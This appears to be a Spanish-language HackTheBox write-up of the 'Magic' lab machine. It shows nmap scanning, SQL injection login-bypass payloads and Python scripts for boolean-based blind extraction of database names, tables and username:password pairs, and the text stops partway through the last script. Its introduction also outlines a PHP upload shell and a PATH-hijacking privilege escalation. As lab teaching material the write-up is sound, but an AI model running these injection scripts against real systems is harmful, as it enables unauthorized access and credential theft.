@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Magic Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Magic Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking">
+
+<meta property="og:url" content="https://celero0.github.io/posts/magic/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Magic Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-31T01:35:22+00:00">
+    <meta property="article:modified_time" content="2026-01-31T01:35:22+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/magic/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/magic/">
+              Magic Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-01-31T01:35:22Z">
+                January 31, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              8-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Linux #Medium #SQLI #Fileupload #PathHijacking</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Esta es una máquina Linux que aloja un servidor web con una aplicación que permite subir imágenes una vez autenticado. Debido a que no contamos con credenciales válidas, se busca una vía de acceso alternativa, logrando un bypass del login mediante una vulnerabilidad de inyección SQL (SQLi).</p>
+<p>Una vez confirmada la existencia del SQLi, se procede a dumpear la base de datos utilizando la técnica <em>boolean-based</em>, encontrando así las credenciales del administrador de la aplicación web.</p>
+<p>Ya dentro del panel de subida de imágenes, se identifica el directorio donde se almacenan los archivos mediante fuzzing con <code>FUZZ</code>. Posteriormente, se realiza la subida de un archivo malicioso en PHP, obteniendo ejecución remota de comandos y acceso inicial a la máquina víctima.</p>
+<p>Con la contraseña obtenida desde la base de datos, se prueba la reutilización de credenciales a nivel de sistema, logrando migrar a otro usuario.</p>
+<p>Finalmente, para la escalada de privilegios, se detecta un binario inusual con permisos SUID. Al analizarlo con <code>strings</code>, se observa que utiliza los binarios <code>cat</code>, <code>ldisk</code> y <code>lshw</code> sin especificar rutas absolutas, lo que permite realizar un ataque de path hijacking. Mediante la creación de un binario malicioso, se asignan permisos SUID a <code>/bin/bash</code>, obteniendo así privilegios de superusuario y comprometiendo completamente el sistema.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Realizamos un escaneo de los puertos, encontrando como resultado el puerto <code>80</code> abierto, que está corriendo el servicio <code>HTTP</code>, y el puerto <code>22</code> corriendo <code>SSH</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.233 -oG allPorts
+</span></span></code></pre></div><img src="/images/Pasted image 20260129185051.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En cuenta a las versiones de estos servicios, tenemos las siguiente</p>
+<img src="/images/Pasted image 20260129185134.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-http">
+  Enumeración HTTP
+  <a class="heading-link" href="#enumeraci%c3%b3n-http">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>La página web es súper simple, tiene un apartado principal, y uno de <code>login</code></p>
+<img src="/images/Pasted image 20260129235839.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si vamos a <code>/login</code>, vemos que necesitamos proporcionar un usuario y contraseña</p>
+<img src="/images/Pasted image 20260129235927.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si utilizamos un usuario cualquiera <code>test:test</code>, vemos el siguiente mensaje</p>
+<img src="/images/Pasted image 20260129235950.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora si mandamos <code>test':test</code>, el primer parámetro con una comilla <code>'</code>, vemos que deja de aparecer el mensaje de error, por tanto parece ser vulnerable a SQLi</p>
+<h1 id="explotando-sqli">
+  Explotando SQLi
+  <a class="heading-link" href="#explotando-sqli">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Interceptamos la petición con <code>Burpsuite</code>, y ahora probamos el siguiente payload para bypassear la página de <code>login</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or &#39;</span>1<span style="color:#a5d6ff">&#39;=&#39;</span>1<span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><p>Enviándolo, vemos que nos redirige hacia <code>upload.php</code></p>
+<img src="/images/Pasted image 20260130001155.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto la web es vulnerable a SQLi, probaremos con una igualdad errónea, para ver si nos muestra un mensaje diferente</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or &#39;</span>1<span style="color:#a5d6ff">&#39;=&#39;</span>2<span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><p>y vemos que aparece nuevamente el error de <code>Javascript</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;</span>script<span style="color:#ff7b72;font-weight:bold">&gt;</span>alert(<span style="color:#a5d6ff">&#39;Wrong Username or Password&#39;</span>)<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#f85149">/script&gt;</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20260130001457.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto tenemos una vía para enumerar la base de datos</p>
+<h2 id="obteniendo-nombre-de-la-bases-de-datos">
+  Obteniendo nombre de la bases de datos
+  <a class="heading-link" href="#obteniendo-nombre-de-la-bases-de-datos">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para obtener el nombre de la base de datos, tenemos el siguiente payload</p>
+<p><strong>Nota:</strong> Utilizamos <code>BINARY</code>, para hacer que la petición sea case-sensitive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or substring(BINARY database(),1,1)=&#39;</span>a<span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><p>Vemos que nos aparece el mensaje de error, por tanto sabemos que el primer carácter del nombre de la base de datos no es <code>a</code></p>
+<p>Si mandamos el siguiente payload, vemos que desaparece el mensaje de error, por tanto el primer carácter es una <code>M</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or substring(BINARY database(),1,1)=&#39;</span>M<span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><p>Para poder encontrar todos los valores del nombre de la base de datos, tenemos el siguiente script en Python</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>baseURL <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://10.129.7.48&#34;</span>
+</span></span><span style="display:flex;"><span>param <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/login.php&#34;</span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#ff7b72;font-weight:bold">=</span> string<span style="color:#ff7b72;font-weight:bold">.</span>ascii_letters <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>digits <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>punctuation
+</span></span><span style="display:flex;"><span>box <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener cookies</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> pos <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">1</span>,<span style="color:#a5d6ff">6</span>):
+</span></span><span style="display:flex;"><span>   <span style="color:#ff7b72">for</span> char <span style="color:#ff7b72;font-weight:bold">in</span> (characters):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;test&#39; or substring(BINARY database(),</span><span style="color:#a5d6ff">{</span>pos<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">,1)=&#39;</span><span style="color:#a5d6ff">{</span>char<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#39;-- -&#34;</span>
+</span></span><span style="display:flex;"><span>      data <span style="color:#ff7b72;font-weight:bold">=</span> {<span style="color:#a5d6ff">&#34;username&#34;</span>: <span style="color:#a5d6ff">&#34;test&#34;</span>, <span style="color:#a5d6ff">&#34;password&#34;</span>: payload }
+</span></span><span style="display:flex;"><span>      r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>post(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param,data<span style="color:#ff7b72;font-weight:bold">=</span>data)
+</span></span><span style="display:flex;"><span>      print(payload)
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">not</span> <span style="color:#a5d6ff">&#34;Wrong&#34;</span> <span style="color:#ff7b72;font-weight:bold">in</span> r<span style="color:#ff7b72;font-weight:bold">.</span>text:
+</span></span><span style="display:flex;"><span>         os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;clear&#34;</span>)
+</span></span><span style="display:flex;"><span>         box <span style="color:#ff7b72;font-weight:bold">=</span> box <span style="color:#ff7b72;font-weight:bold">+</span> char
+</span></span><span style="display:flex;"><span>         print(box)
+</span></span><span style="display:flex;"><span>         <span style="color:#ff7b72">break</span>
+</span></span></code></pre></div><p>Utilizandolo encontramos que el nombre de la base de datos es <code>Magic</code></p>
+<h2 id="obteniendo-las-tablas-de-magic">
+  Obteniendo las tablas de Magic
+  <a class="heading-link" href="#obteniendo-las-tablas-de-magic">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>El payload para encontrar las tablas de la base de datos <code>Magic</code> es el siguiente</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test<span style="color:#a5d6ff">&#39; or substring((select group_concat(table_name) from information_schema.tables where table_schema=&#39;</span>Magic<span style="color:#a5d6ff">&#39;),{pos},1)=&#39;</span><span style="color:#ff7b72;font-weight:bold">{</span>char<span style="color:#ff7b72;font-weight:bold">}</span><span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><p>Por tanto, podemos crear un script en Python, para que nos devuelva todos los nombres de las tablas</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>baseURL <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://10.129.7.48&#34;</span>
+</span></span><span style="display:flex;"><span>param <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/login.php&#34;</span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;,&#39;</span> <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>ascii_letters <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>digits <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>punctuation
+</span></span><span style="display:flex;"><span>box <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener cookies</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> pos <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">1</span>,<span style="color:#a5d6ff">300</span>):
+</span></span><span style="display:flex;"><span>   <span style="color:#ff7b72">for</span> char <span style="color:#ff7b72;font-weight:bold">in</span> (characters):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;test&#39; or substring((select group_concat(table_name) from information_schema.tables where table_schema=&#39;Magic&#39;),</span><span style="color:#a5d6ff">{</span>pos<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">,1)=&#39;</span><span style="color:#a5d6ff">{</span>char<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#39;-- -&#34;</span>
+</span></span><span style="display:flex;"><span>      data <span style="color:#ff7b72;font-weight:bold">=</span> {<span style="color:#a5d6ff">&#34;username&#34;</span>: <span style="color:#a5d6ff">&#34;test&#34;</span>, <span style="color:#a5d6ff">&#34;password&#34;</span>: payload }
+</span></span><span style="display:flex;"><span>      r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>post(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param,data<span style="color:#ff7b72;font-weight:bold">=</span>data)
+</span></span><span style="display:flex;"><span>      print(payload)
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">not</span> <span style="color:#a5d6ff">&#34;Wrong&#34;</span> <span style="color:#ff7b72;font-weight:bold">in</span> r<span style="color:#ff7b72;font-weight:bold">.</span>text:
+</span></span><span style="display:flex;"><span>         os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;clear&#34;</span>)
+</span></span><span style="display:flex;"><span>         box <span style="color:#ff7b72;font-weight:bold">=</span> box <span style="color:#ff7b72;font-weight:bold">+</span> char
+</span></span><span style="display:flex;"><span>         print(box)
+</span></span><span style="display:flex;"><span>         <span style="color:#ff7b72">break</span>
+</span></span></code></pre></div><p>y el resultado es que sólo existe la tabla <code>login</code></p>
+<h2 id="obteniendo-las-columnas-de-la-tabla-login">
+  Obteniendo las columnas de la tabla login
+  <a class="heading-link" href="#obteniendo-las-columnas-de-la-tabla-login">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para obtener las columnas de la tabla <code>login</code>, tenemos el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test<span style="color:#a5d6ff">&#39; or substring((select group_concat(column_name) from information_schema.columns where table_schema=&#39;</span>Magic<span style="color:#a5d6ff">&#39; and table_name=&#39;</span>login<span style="color:#a5d6ff">&#39;),{pos},1)=&#39;</span><span style="color:#ff7b72;font-weight:bold">{</span>char<span style="color:#ff7b72;font-weight:bold">}</span><span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><p>Para obtener todas las columnas, podemos utilizar el siguiente script</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>baseURL <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://10.129.7.48&#34;</span>
+</span></span><span style="display:flex;"><span>param <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/login.php&#34;</span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;,&#39;</span> <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>ascii_letters <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>digits <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>punctuation
+</span></span><span style="display:flex;"><span>box <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener cookies</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> pos <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">1</span>,<span style="color:#a5d6ff">300</span>):
+</span></span><span style="display:flex;"><span>   <span style="color:#ff7b72">for</span> char <span style="color:#ff7b72;font-weight:bold">in</span> (characters):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;test&#39; or substring((select group_concat(column_name) from information_schema.columns where table_schema=&#39;Magic&#39; and table_name=&#39;login&#39;),</span><span style="color:#a5d6ff">{</span>pos<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">,1)=&#39;</span><span style="color:#a5d6ff">{</span>char<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#39;-- -&#34;</span>
+</span></span><span style="display:flex;"><span>      data <span style="color:#ff7b72;font-weight:bold">=</span> {<span style="color:#a5d6ff">&#34;username&#34;</span>: <span style="color:#a5d6ff">&#34;test&#34;</span>, <span style="color:#a5d6ff">&#34;password&#34;</span>: payload }
+</span></span><span style="display:flex;"><span>      r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>post(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param,data<span style="color:#ff7b72;font-weight:bold">=</span>data)
+</span></span><span style="display:flex;"><span>      print(payload)
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">not</span> <span style="color:#a5d6ff">&#34;Wrong&#34;</span> <span style="color:#ff7b72;font-weight:bold">in</span> r<span style="color:#ff7b72;font-weight:bold">.</span>text:
+</span></span><span style="display:flex;"><span>         os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;clear&#34;</span>)
+</span></span><span style="display:flex;"><span>         box <span style="color:#ff7b72;font-weight:bold">=</span> box <span style="color:#ff7b72;font-weight:bold">+</span> char
+</span></span><span style="display:flex;"><span>         print(box)
+</span></span><span style="display:flex;"><span>         <span style="color:#ff7b72">break</span>
+</span></span></code></pre></div><p>Encontramos las columnas <code>id</code>,<code>username</code> y <code>password</code></p>
+<h2 id="obteniendo-los-datos-user-y-pass">
+  Obteniendo los datos user y pass
+  <a class="heading-link" href="#obteniendo-los-datos-user-y-pass">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para obtener los datos de la columna <code>username</code>, y la columna <code>password</code>. Podemos utilizar el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>import requests
+</span></span><span style="display:flex;"><span>import string
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>import sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">baseURL</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://10.129.7.48&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">param</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/login.php&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">characters</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;,&#39;</span>+ <span style="color:#a5d6ff">&#39;:&#39;</span> + string.ascii_letters + string.digits + string.punctuation
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">box</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">END</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener cookies</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">s</span> <span style="color:#ff7b72;font-weight:bold">=</span> requests.Session<span style="color:#ff7b72;font-weight:bold">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> pos in range<span style="color:#ff7b72;font-weight:bold">(</span>1,300<span style="color:#ff7b72;font-weight:bold">)</span>:
+</span></span><span style="display:flex;"><span>   <span style="color:#79c0ff">END</span> <span style="color:#ff7b72;font-weight:bold">=</span> END + <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ff7b72">for</span> char in <span style="color:#ff7b72;font-weight:bold">(</span>characters<span style="color:#ff7b72;font-weight:bold">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">=</span> f<span style="color:#a5d6ff">&#34;test&#39; or substring((select group_concat(BINARY username, &#39;:&#39;, BINARY password) from login),{pos},1)=&#39;{char}&#39;-- -&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#79c0ff">data</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">{</span><span style="color:#a5d6ff">&#34;username&#34;</span>: <span style="color:#a5d6ff">&#34;test&#34;</span>, <span style="color:#a5d6ff">&#34;password&#34;</span>: payload <span style="color:#ff7b72;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#79c0ff">r</span> <span style="color:#ff7b72;font-weight:bold">=</span> s.post<span style="color:#ff7b72;font-weight:bold">(</span>baseURL + param,data<span style="color:#ff7b72;font-weight:bold">=</span>data<span style="color:#ff7b72;font-weight:bold">)</span>
